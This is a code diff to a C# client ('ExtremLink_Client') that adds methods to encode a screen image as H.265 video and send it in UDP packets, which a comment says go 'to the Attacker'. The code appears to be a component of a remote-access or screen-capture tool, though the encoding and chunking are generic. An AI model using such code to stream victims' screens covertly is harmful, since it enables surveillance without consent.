@@ -11,6 +11,9 @@ using System.Windows.Media.Imaging;
 using System.Windows;
 using System.Net;
 using System.Net.Sockets;
+using System.Drawing;
+using OpenCvSharp;
+
 
 namespace ExtremLink_Client.Classes
 {
@@ -337,6 +340,68 @@ namespace ExtremLink_Client.Classes
 
 
         // Sending frame functions:
+        public string ConvertPngToH265(string pngFile)
+        {
+            // Input: A string which represent a png file name.
+            // Output: The function creates a temp h265 file and returns it's name.
+            string tempH265File = "temp.h265";
+            using Mat image = Cv2.ImRead(pngFile);
+            int width = image.Width;
+            int height = image.Height;
+
+            // Create H.265 video writer
+            using var writer = new VideoWriter(
+                tempH265File,
+                FourCC.HEVC,  // H.265 codec
+                30,           // FPS
+                new OpenCvSharp.Size(width, height));
+
+            // Write frames (5 seconds * 30 FPS)
+            for (int i = 0; i < 150; i++)
+            {
+                writer.Write(image);
+            }
+            return tempH265File;
+
+        }
+        public byte[] ConvertH265ToByteArray(string h265File)
+        {
+            // Input: A string which represent a h265 file name.
+            // Output: The function returns the file content as a byte array.
+            return File.ReadAllBytes(h265File);
+        }
+        public void SendFrame(byte[] frame)
+        {
+            // Input: A byte array which contains the content of an h265 file.
+            // Output: The function sends the given byte array to the Attacker.
+
+            // Define packet size (MTU-safe)
+            const int packetSize = 1400; // Keeping under the MTU limit
+            int totalPackets = (int)Math.Ceiling((double)frame.Length / packetSize);
+
+            // Generate a random stream ID to identify this data stream
+            int streamId = new Random().Next(1, int.MaxValue);
+
+            // Send packets
+            for (int i = 0; i < totalPackets; i++)
+            {
+                // Calculate packet bounds
+                int offset = i * packetSize;
+                int size = Math.Min(packetSize, frame.Length - offset);
+
+                // Construct packet (12 bytes of metadata + segment data)
+                byte[] packet = new byte[size + 12];
+                BitConverter.GetBytes(streamId).CopyTo(packet, 0);         // 4 bytes: Stream ID
+                BitConverter.GetBytes(totalPackets).CopyTo(packet, 4);     // 4 bytes: Total packets
+                BitConverter.GetBytes(i).CopyTo(packet, 8);                // 4 bytes: Packet index
+                Array.Copy(frame, offset, packet, 12, size);               // Segment data
+
+                // Send packet
+                this.udpSocket.SendTo(packet, this.serverUdpEndPoint);
+            }
+        }
+
+
         private byte[] ConvertRenderTargetBitmapToByteArray(RenderTargetBitmap renderTarget)
         {
             // The function gets a RenderTargetBitmap object.
